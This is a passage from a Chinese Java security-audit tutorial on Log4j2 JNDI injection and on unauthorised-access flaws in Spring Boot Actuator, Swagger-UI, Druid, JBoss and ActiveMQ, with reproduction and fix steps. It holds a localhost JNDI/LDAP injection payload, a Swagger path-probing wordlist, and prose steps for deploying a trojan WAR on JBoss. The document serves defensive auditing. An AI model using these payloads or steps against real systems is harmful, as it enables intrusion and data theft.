+- JNDI中的一组绑定作为上下文来引用。每个上下文暴露的一组操作是一致的。例如**，每个上下文提供了一个查找操作，返回指定名字的相应对象**。每个上下文都提供了绑定和撤除绑定名字到某个对象的操作。JNDI使用通用的方式来暴露命名空间，即使用分层上下文以及使用相同命名语法的子上下文。
+  简单来说：通过JNDI提供了"通**过名称找到对应的对象"的规范定义**，即SPI功能，实现则由具体的技术支持，如：LDAP，RMI，DNS，Database。
+
+**（2）、LDAP原理**
+
+- 目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，支持过滤功能。
+
+- LDAP（Light Directory Access Portocol），它是基于X.500标准的轻量级目录访问协议。
+
+- 目录是一个为查询、浏览和搜索而优化的数据库，它成树状结构组织数据，类似文件目录一样。目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好象它的名字一样。
+
+- **LDAP目录服务是由目录数据库和一套访问协议组成的系统**。
+
+**（3）、漏洞介绍**
+
+ Log4j2默认支持解析ldap/rmi协议（只要打印的日志中包括ldap/rmi协议即可），并会通过名称从ldap服务端获取对应的Class文件，使用ClassLoader在本地加载Ldap服务端返回的Class类。这就为攻击者提供了攻击途径，攻击者可以在界面传入一个包含恶意内容（会提供一个恶意的Class文件）的ldap协议内容（如：恶意内容${jndi:ldap://localhost:9999/Test}恶意内容），该内容传递到后端被log4j2打印出来，就会触发恶意的Class的加载执行（可执行任意后台指令），从而达到攻击的目的。
+
+![image-20231127142522983](/Users/bingtanghulu/Library/Application Support/typora-user-images/image-20231127142522983.png)
+
+（1）首先攻击者找到存在风险的接口（接口会将前端输入直接通过日志打印出来），然后向该接口发送攻击内容：${jndi:ldap://localhost:9999/Test}。
+
+（2）被攻击服务器接收到该内容后，通过Logj42工具将其作为日志打印。
+
+（3）此时Log4j2会解析${}，读取出其中的内容。判断其为Ldap实现的JNDI。于是调用Java底层的Lookup方法，尝试完成Ldap的Lookup操作。
+
+```java
+StrSubstitutor.substitute(...) --解析出${}中的内容：jndi:ldap://localhost:9999/Test
+	> StrSubstitutor.resolveVariable(...) --处理解析出的内容，执行lookup
+	> Interpolator.lookup(...) --根据jndi找到jndi的处理类
+		> JndiLookup.lookup(...)
+		> JndiManager.lookup(...)
+			> java.naming.InitialContext.lookup(...) --调用Java底层的Lookup方法
+```
+
+后续步骤都是Java内部提供的Lookup能力，和Log4j2无关。
+
+（4）请求Ldap服务器，获取到Ldap协议数据。Ldap会返回一个Codebase告诉客户端，需要从该Codebase去获取其需要的Class数据
+
+```java
+LdapCtx.c_lookup(...) 请求并处理数据 （ldap中指定了javaCodeBase=）
+	>Obj.decodeObject --解析到ldap结果，得到classFactoryLocation=http://localhost:8888
+	> DirectoryManager.getObjectInstance(...) --请求Codebase得到对应类的结果
+		> NamingManager.getObjectFactoryFromReference(...) --请求Codebase
+```
+
+（5）请求Ldap中返回的Codebase路径，去Codebase下载对应的Class文件，并通过类加载器将其加载为Class类，然后调用其默认构造函数将该Class类实例化成一个对象。
+
+```java
+VersionHelper12.loadClass(...) --请求Codebase得到Class并用类加载器加载
+
+> ​	NamingManager.getObjectFactoryFromReference(...) 通过默认构造函数**实例化类。
+```
+
+**这里就会导致我们攻击代码中的静态块中的内容被执行。**
+
+总结：
+
+1、攻击则发送带有恶意Ldap内容的字符串，让服务通过log4j2打印
+
+2、log4j2解析到ldap内容，会调用底层Java去执行Ldap的lookup操作。
+
+3、Java底层请求Ldap服务器（恶意服务器），得到了Codebase地址，告诉客户端去该地址获取他需要的类。
+
+4、Java请求Codebase服务器(恶意服务器)获取到对应的类（恶意类），并在**本地加载和实例化**（触发恶意代码）。
+
+## 十三、常见的未授权漏洞
+### （一）、Springboot Actuator未授权漏洞
+
+目前SpringBoot框架，越来越广泛，大多数中小型企业，在开发新项目得时候。后端语言使用java得情况下，首选都会使用到SpringBoot。
+
+actuator是Springboot提供的用来对应用系统进行自身和监控的功能模块，借助于Actuator可以很方便地对应用系统某些监控指标进行查看、统计等。Actuator 的核心是端点 Endpoint，它用来监视应用程序及交互，spring-boot-actuator 中已经内置了非常多的Endpoint（health、info、beans、metrics、httptrace、shutdown等等），同时也允许我们自己扩展自己的Endpoints。每个 Endpoint 都可以启用和禁用。要远程访问 Endpoint，还必须通过 JMX 或 HTTP 进行暴露，大部分应用选择HTTP。**Actuator在带来方便的同时，如果没有管理好，会导致一些敏感的信息泄露；可能会导致我们的服务器，被暴露到外网，服务器可能会沦陷。泄露的信息报错不局限于接口API、可能会涉及到数据库，redis等等的连接信息，一旦泄露具有严重的安全隐患。**
+
+环境搭建与复现
+
+创建或直接找一个开源的sringboot项目，在pom文件中直接引入相关依赖即可
+
+```xml
+<!--健康监控-->
+    <dependency>
+        <groupId>org.springframework.boot</groupId>
+        <artifactId>spring-boot-starter-actuator</artifactId>
+    </dependency>
+```
+
+在application 进行以下设置
+
+```java
+info:
+  application:
+    name: "@project.name@" #从pom.xml中获取
+    description: "@project.description@"
+    version: "@project.version@"
+management:
+  server:
+    port: 5400  # 指定监听端口，不指定则与server端口一直
+  endpoints: # 启动所有监控点
+    web:
+      exposure:
+        include: '*'
+  info: # spring-boot 2.6以后info默认值为false.需手动开启
+    env:
+      enabled: true
+```
+
+当访问http://localhost:5400/actuator/beans，出现页面且无需授权，说明引入成功
+
+可能会出现一个问题，当项目使用了全局拦截技术，例如shiro控制全局权限，直接访问路径会出现无法访问强制跳转到登录页面。需要将其路径添加到过滤器白名单
+
+<img width="955" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/3f8c0e7d-ca30-4776-ba14-72c29df07ca7">
+
+
+**审计及修复**
+
+主要审计方法：
+
+1、确定springboot项目是否引用了spring actuator组件进行监控
+
+2、如果引用了该组件，看是否采取了默认的设置，也就是说看是否进行了访问认证。
+
+常见的修复方式如下：
+
+（1）如使用，只开放必要应用，可禁用env等敏感信息的访问。
+
+使用exclude属相进行禁用env
+
+```java
+management:
+  server:
+    port: 5400  # 指定监听端口，不指定则与server端口一直
+  endpoints: # 启动所有监控点
+    web:
+      exposure:
+        exclude: 'env'
+      # include: '*'  # 允许访问所有的应用
+  info: # spring-boot 2.6以后info默认值为false.需手动开启
+    env:
+      enabled: true
+```
+
+当在访问时出现无法访
+
+（2）在application.properties中开启security功能，配置访问权限验证，这时再访问actuator功能时就会弹出登录窗口，需要输入账号密码验证后才允许访问。
+
+首先引入springsecurity的组件，并配置拦截配置文件
+
+```java
+<dependency>
+    <groupId>org.springframework.boot</groupId>
+    <artifactId>spring-boot-starter-security</artifactId>
+</dependency>
+```
+
+```java
+package com.hospital.web.core.config;
+import org.apache.commons.lang3.StringUtils;
+import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.context.annotation.Configuration;
+import org.springframework.core.env.Environment;
+import org.springframework.security.config.annotation.web.builders.HttpSecurity;
+import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
+import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
+// 使用@Configuration注解表示这个类是一个配置类。
+@Configuration
+//// 使用@EnableWebSecurity注解启用Spring Security的功能
+@EnableWebSecurity
+public class ActuatorSecurityConfig extends WebSecurityConfigurerAdapter {
+// 使用@Autowired注解自动注入Environment对象。这样就可以获取应用的配置信息。
+    @Autowired
+    Environment env;
+
+   protected void configure(HttpSecurity httpSecurity) throws Exception {
+     //使用httpBasic()方法启用HTTP基本认证。  
+        httpSecurity.httpBasic()
+                .and()
+                .authorizeRequests()
+                .antMatchers("/actuator/**").authenticated()
+                .anyRequest().permitAll()
+                .and()
+                .csrf().disable();
+    }
+}
+```
+
+其中主要设置了HTTP基本认证，并针对"/actuator/**"路径的请求要求身份验证，而其他所有请求则不需要身份验证。
+
+（3）如果不使用actuator直接全部禁用
+
+可通过代码配置(直接注释掉一下代码也可以)，或直接去除掉spingboot-actuator的组件引用
+
+```java
+management.server.port=-1
+```
+
+<img width="462" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/ce2134db-312a-4870-ba28-c0e35426212b">
+
+
+### （二）、Swigger-ui未授权漏洞
+
+Swagger是一个规范和完整的框架，用于生成、描述、调用和可视化 RESTful 风格的 Web 服务，JAVA在金融机构开发语言的地位一直居高不下，而作为JAVA届服务端的大一统框架Spring，便将Swagger规范纳入自身的标准，建立了Spring-swagger项目，所以在实际测试环境中，基于spring框架的swagger-ui接口展示及调试文档页面最为常见。可利用未授权访问漏洞，直接访问以下链接：
+
+```xml
+/api
+/api-docs
+/api-docs/swagger.json
+/api.html
+/api/api-docs
+/api/apidocs
+/api/doc
+/api/swagger
+/api/swagger-ui
+/api/swagger-ui.html
+/api/swagger-ui.html/
+/api/swagger-ui.json
+/api/swagger.json
+/api/swagger/
+/api/swagger/ui
+/api/swagger/ui/
+/api/swaggerui
+/api/swaggerui/
+/api/v1/
+/api/v1/api-docs
+/api/v1/apidocs
+/api/v1/swagger
+/api/v1/swagger-ui
+/api/v1/swagger-ui.html
+/api/v1/swagger-ui.json
+/api/v1/swagger.json
+/api/v1/swagger/
+/api/v2
+/api/v2/api-docs
+/api/v2/apidocs
+/api/v2/swagger
+/api/v2/swagger-ui
+/api/v2/swagger-ui.html
+/api/v2/swagger-ui.json
+/api/v2/swagger.json
+/api/v2/swagger/
+/api/v3
+/apidocs
+/apidocs/swagger.json
+/doc.html
+/docs/
+/druid/index.html
+/graphql
+/libs/swaggerui
+/libs/swaggerui/
+/spring-security-oauth-resource/swagger-ui.html
+/spring-security-rest/api/swagger-ui.html
+/sw/swagger-ui.html
+/swagger
+/swagger-resources
+/swagger-resources/configuration/security
+/swagger-resources/configuration/security/
+/swagger-resources/configuration/ui
+/swagger-resources/configuration/ui/
+/swagger-ui
+/swagger-ui.html
+/swagger-ui.html#/api-memory-controller
+/swagger-ui.html/
+/swagger-ui.json
+/swagger-ui/swagger.json
+/swagger.json
+/swagger.yml
+/swagger/
+/swagger/index.html
+/swagger/static/index.html
+/swagger/swagger-ui.html
+/swagger/ui/
+/Swagger/ui/index
+/swagger/ui/index
+/swagger/v1/swagger.json
+/swagger/v2/swagger.json
+/template/swagger-ui.html
+/user/swagger-ui.html
+/user/swagger-ui.html/
+/v1.x/swagger-ui.html
+/v1/api-docs
+/v1/swagger.json
+/v2/api-docs
+/v3/api-docs
+```
+
+Swagger未开启页面访问限制，Swagger未开启严格的Authorize认证。通过翻查文档，得到api接口，得到api接口，点击parameters，即可得到该api接口的详细参数。直接构造参数发包，通过回显可以得到大量的用户信息，包含了手机号，邮箱等。
+
+**环境搭建与复现**
+
+引入swagger相关的依赖，以hostipal项目为例，直接在pom.xml引入依赖
+
+```xml
+			<!-- swagger2-->
+			<dependency>
+				<groupId>io.springfox</groupId>
+				<artifactId>springfox-swagger2</artifactId>
+				<version>${swagger.version}</version>
+				<exclusions>
+				    <exclusion>
+				        <groupId>io.swagger</groupId>
+				        <artifactId>swagger-annotations</artifactId>
+				    </exclusion>
+				    <exclusion>
+				        <groupId>io.swagger</groupId>
+				        <artifactId>swagger-models</artifactId>
+				    </exclusion>
+				</exclusions>
+			</dependency>
+			
+			<!-- swagger2-UI-->
+			<dependency>
+				<groupId>io.springfox</groupId>
+				<artifactId>springfox-swagger-ui</artifactId>
+				<version>${swagger.version}</version>
+			</dependency>
+```
+
+设置相关配置文件
+
+```java
+import org.springframework.context.annotation.Bean;
+import org.springframework.context.annotation.Configuration;
+import com.hospital.common.config.Global;
+import io.swagger.annotations.ApiOperation;
+import springfox.documentation.builders.ApiInfoBuilder;
+import springfox.documentation.builders.PathSelectors;
+import springfox.documentation.builders.RequestHandlerSelectors;
+import springfox.documentation.service.ApiInfo;
+import springfox.documentation.service.Contact;
+import springfox.documentation.spi.DocumentationType;
+import springfox.documentation.spring.web.plugins.Docket;
+import springfox.documentation.swagger2.annotations.EnableSwagger2;
+
+/**
+ * Swagger2的接口配置
+ *
+ * @author wangchunhong
+ */
+@Configuration
+@EnableSwagger2
+public class SwaggerConfig
+{
+    /**
+     * 创建API
+     */
+    @Bean
+    public Docket createRestApi()
+    {
+        return new Docket(DocumentationType.SWAGGER_2)
+                // 用来创建该API的基本信息，展示在文档的页面中（自定义展示的信息）
+                .apiInfo(apiInfo())
+                // 设置哪些接口暴露给Swagger展示
+                .select()
+                // 扫描所有有注解的api，用这种方式更灵活
+                .apis(RequestHandlerSelectors.withMethodAnnotation(ApiOperation.class))
+                // 扫描指定包中的swagger注解
+                //.apis(RequestHandlerSelectors.basePackage("com.hospital.project.tool.swagger"))
+                // 扫描所有 .apis(RequestHandlerSelectors.any())
+                .paths(PathSelectors.any())
+                .build();
+    }
+
+    /**
+     * 添加摘要信息
+     */
+    private ApiInfo apiInfo()
+    {
+        // 用ApiInfoBuilder进行定制
+        return new ApiInfoBuilder()
+                // 设置标题
+                .title("标题：若依管理系统_接口文档")
+                // 描述
+                .description("描述：用于管理集团旗下公司的人员信息,具体包括XXX,XXX模块...")
+                // 作者信息
+                .contact(new Contact(Global.getName(), null, null))
+                // 版本
+                .version("版本号:" + Global.getVersion())
+                .build();
+    }
+}
+```
+
+3、向各个controller中提供@Api，也就是说将API通过swigger-ui对外开放，参考如下
+
+```java
+@Api(description = "系统用户相关接口", tags = ApiIndex.UserController)
+@RequestMapping(value = "/api/user")
+@RestController
+public class UserController {
+    @Autowired
+    IUserService service;
+ 
+	@ApiOperation(value = "查询列表")
+    @GetMapping(value = "/list")
+    @ApiImplicitParam(name = "token", value = "签名", paramType = "query", dataType = "String")
+    @Token
+    public R<PageInfo<List<UserVO>>> list(
+            @ApiParam(value = "查询参数") @ModelAttribute UserSearchVO searchVO) {
+        List<UserVO> list = service.getList(searchVO);
+        PageInfo pageInfo = new PageInfo(list);
+        return new R(pageInfo);
+    }
+```
+
+4、重启服务，直接访问[http://localhost/swagger-ui.html](http://localhost:8080/swagger-ui.html)
+
+<img width="958" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/a0ff5010-20a8-41d6-94fa-9a8f76ee6dd7">
+
+
+**审计及修复**
+
+1、审计方式：
+
+- 主要是排查看pom.xml文件中是否引用了swagger组件
+- 是否存在SwaggerConfig相关的配置代码
+- 各个controller类中的接口是否引用了@Api，各个方法中是否引用了@ApiOperation。
+
+同时存在以上三种情况，可以确定存在该漏洞。
+
+2、修复方式
+
+1. 配置Swagger开启页面访问限制。
+
+（1）修改application.yml中的swagger配置
+
+```xml
+swagger:
+  ui-config:
+    # method<按方法定义顺序排序>
+    operations-sorter: method
+  basic:
+    enable: true
+    ## Basic认证用户名
+    username: admin
+    ## Basic认证密码
+    password: nimda
+```
+
+（2）修改swagger2Config文件，具体可参考如下
+
+```java
+@Slf4j
+@Configuration
+@EnableSwagger2
+@EnableSwaggerBootstrapUI
+@Profile({"dev","test"})
+public class Swagger2Config implements WebMvcConfigurer {
+ 
+	/**
+	 *
+	 * 显示swagger-ui.html文档展示页，还必须注入swagger资源：
+	 * 
+	 * @param registry
+	 */
+	@Override
+	public void addResourceHandlers(ResourceHandlerRegistry registry) {
+		registry.addResourceHandler("swagger-ui.html").addResourceLocations("classpath:/META-INF/resources/");
+		registry.addResourceHandler("doc.html").addResourceLocations("classpath:/META-INF/resources/");
+		registry.addResourceHandler("/webjars/**").addResourceLocations("classpath:/META-INF/resources/webjars/");
+	}
+ 
+	/**
+	 * swagger2的配置文件，这里可以配置swagger2的一些基本的内容，比如扫描的包等等
+	 *
+	 * @return Docket
+	 */
+	@Bean
+	public Docket createRestApi() {
+		return new Docket(DocumentationType.SWAGGER_2)
+				.apiInfo(apiInfo())
+				.select()
+				//此包路径下的类，才生成接口文档
+				.apis(RequestHandlerSelectors.basePackage("org.jeecg.modules"))
+				//加了ApiOperation注解的类，才生成接口文档
+	            .apis(RequestHandlerSelectors.withMethodAnnotation(ApiOperation.class))
+				.paths(PathSelectors.any())
+				.build()
+				.securitySchemes(Collections.singletonList(securityScheme()))
+				.securityContexts(securityContexts())
+				.globalOperationParameters(setHeaderToken());
+	}
+ 
+	/***
+	 * oauth2配置
+	 * 需要增加swagger授权回调地址
+	 * http://localhost:8888/webjars/springfox-swagger-ui/o2c.html
+	 * @return
+	 */
+	@Bean
+	SecurityScheme securityScheme() {
+		return new ApiKey(DefContants.X_ACCESS_TOKEN, DefContants.X_ACCESS_TOKEN, "header");
+	}
+ 
+	private List<SecurityContext> securityContexts() {
+		List<SecurityContext> securityContexts=new ArrayList<>();
+		securityContexts.add(
+				SecurityContext.builder()
+						.securityReferences(defaultAuth())
+						.forPaths(PathSelectors.regex("^(?!auth).*$"))
+						.build());
+		return securityContexts;
+	}
+ 
+	List<SecurityReference> defaultAuth() {
+		AuthorizationScope authorizationScope = new AuthorizationScope("global", "accessEverything");
+		AuthorizationScope[] authorizationScopes = new AuthorizationScope[1];
+		authorizationScopes[0] = authorizationScope;
+		List<SecurityReference> securityReferences=new ArrayList<>();
+		securityReferences.add(new SecurityReference("Authorization", authorizationScopes));
+		return securityReferences;
+	}
+	/**
+	 * JWT token
+	 * @return
+	 */
+	private List<Parameter> setHeaderToken() {
+        ParameterBuilder tokenPar = new ParameterBuilder();
+        List<Parameter> pars = new ArrayList<>();
+        tokenPar.name(DefContants.X_ACCESS_TOKEN).description("token").modelRef(new ModelRef("string")).parameterType("header").required(false).build();
+        pars.add(tokenPar.build());
+        return pars;
+    }
+ 
+	/**
+	 * api文档的详细信息函数,注意这里的注解引用的是哪个
+	 *
+	 * @return
+	 */
+	private ApiInfo apiInfo() {
+		return new ApiInfoBuilder()
+				// //大标题
+				.title("Jeecg-Boot 后台服务API接口文档")
+				// 版本号
+				.version("1.0")
+//				.termsOfServiceUrl("NO terms of service")
+				// 描述
+				.description("后台API接口")
+				// 作者
+				.contact("JEECG团队")
+                .license("The Apache License, Version 2.0")
+                .licenseUrl("http://www.apache.org/licenses/LICENSE-2.0.html")
+				.build();
+	}
+```
+
+当在访问[http://localhost/swagger-ui.html](http://localhost:8080/swagger-ui.html),将会要求授权认证
+
+### （三）、druid未授权漏洞
+
+Druid是为监控而生的数据库连接池，是阿里巴巴数据库事业部出品。Druid提供的监控功能，有数据源、SQL监控、SQL防火墙、Web应用、URL监控、Session监控、Spring监控、JSON API等等。当开发者配置不当时就可能造成未授权访问。
+
+**环境搭建与复现**
+
+在项目中引入以下依赖：
+
+```xml
+<dependency>
+  <groupId>com.alibaba</groupId>
+  <artifactId>druid-spring-boot-starter</artifactId>
+  <version>1.1.9</version>
+</dependency>
+```
+
+启动项目之后，访问/druid/index.html即可
+
+<img width="621" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/1ee90e47-f8b1-4d40-875d-172f37959c52">
+
+审计及修复
+
+1、升级依赖版本到执行版本，以1.2.6为例
+
+```xml
+<dependency>
+    <groupId>com.alibaba</groupId>
+    <artifactId>druid-spring-boot-starter</artifactId>
+    <version>1.2.6</version>
+ </dependency>
+```
+
+2、在application.yml配置相关的认证账号
+
+```java
+spring:
+  datasource:
+    druid:
+      stat-view-servlet:
+        
+        enabled: false
+        #使重置功能不起作用
+        reset-enable: false
+        #配置访问监控view的用户名密码
+        login-username: admin
+        login-password: nimda
+        #IP白名单 (没有配置或者为空，则允许所有访问)
+        allow: 127.0.0.1,192.168.1.1
+        # IP黑名单 (存在共同时，deny优先于allow)
+#        deny: 192.168.10.1 
+
+```
+
+当在访问URL时要求输入正确的账密认证通过后，才可访问
+
+### （四）、jboss未授权漏洞
+
+BOSS是一个基于J2EE的开放源代码应用服务器，也是一个管理EJB的容器和服务器，默认使用8080端口监听。
+
+JBOSS未授权访问漏洞表现为，在默认情况下无需账密就可以直接访问 **http://127.0.0.1:8080/jmx-console** 进入管理控制台，进而导致网站信息泄露、服务器被上传shell（如反弹shell，wget写webshell文件），最终网站被攻陷。该漏洞影响所有低版本【哪些版本】的JBOSS，对其下用户影响深远。
+
+**环境搭建与复现**
+
+使用docker直接搭建jboss4版本的环境
+
+（1）拉取docker的jboss镜像
+
+docker pull testjboss/jboss
+
+（2）将镜像转换成容器，并启动容器
+
+docker run -d-p 80:8080 testjboss/jboss
+
+（3）搭建环境测试效果如下
+
+<img width="488" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/22ef5f1a-321e-4c13-b71e-c08467a236e0">
+
+使用jboss部署带有木马的war
+
+（1）直接访问部署页面，通过addURL完成远程部署（需要准备一个能够下载到木马的web服务，这里使用的apache服务）
+
+<img width="387" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/a6622d13-6620-4669-bc7e-9638003280d1">
+
+（2）完成部署后，会返现web的war中多个刚刚部署的war，jboss会自动压缩该war，用户能够直接访问，说明漏洞环境搭建成功
+
+<img width="464" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/5a169caa-3019-47c6-ad12-e88e93b05487">
+
+（3）使用对应的木马连接工具远程连接即可
+
+**审计及修复**
+
+此漏洞没有任何条件限制，只要确定jboss版本为低版本，即存在该漏洞
+
+### （五）、Active MQ未授权及弱口令漏洞
+
+ActiveMQ是⼀款流⾏的开源消息服务器，是 Apache 出品，最流行的，能力强劲的开源消息总线。Activemq activeMQ是一种开源的,实现了JMS1.1规范的,面向消息(MOM)的中间件,为应用程序提供高效的.可扩展的.稳定的和安全的企业级消息通信。Activemq 的作用就是系统之间进行通信，原理是生产者将消息发送给ActiveMQ服务端,服务端会根据该消息对应的目标模型(p2p/topic)将消息发送给可以接受的消费者,期间默认会将数据进行持久化,并等待消费者签收消息后才会将消息删除,避免消息丢失
+
+其主要是默认情况下，ActiveMQ服务是没有配置安全参数。恶意⼈员可以利⽤默认配置弱点发动远程命令执⾏攻击，获取服务器权限，从⽽导致数据泄露。
+
+**环境搭建与复现**
+
+（1）使用docker通过vulhub靶场搭建Active MQ的环境，访问8161端口，访问admin目录下，输入初始密码admin,发现成功登录后台
+
+<img width="578" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/37d81fa4-7f9e-458a-84c5-16bd572d7dd5">
+
+<img width="789" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/928e41dd-769e-41a2-a2a5-b290ae18b2f3">
+
+**审计及修复**
+审计方式：
+如果是maven项目，通过pom.xml或对于非maven的传统项目，确定lib包查看是否引入了低版本的activemq,已经是否是使用了弱口令，同时咨询运维同事是否在服务端已经修改了弱口令或未授权的问题。
+修复方式：
+
+（1）审计activemq最新版本
+（2）针对未收授权访问，可修改conf/jetty.xml文件，bean id为securityConstraint下的authenticate修改值为true,重启服务器即可。针对弱口令，可修改conf/jetty.xml文件，bean id为securityLoginService下conf值获取用户properties,修改用户名密码，重启服务即可
+
+## 十四、实战审计
+
+（一）、OFCMS代码审计
+（二）、ERP2.3版本代码审计
+（三）、若依CMS 4.6版本代码审计
+（四）、若依CMS 3.2版本代码审计
+（五）、oasys 代码审计
+（六）、Tmall 代码审计
+（七）、vulns 代码审计
+
+
+
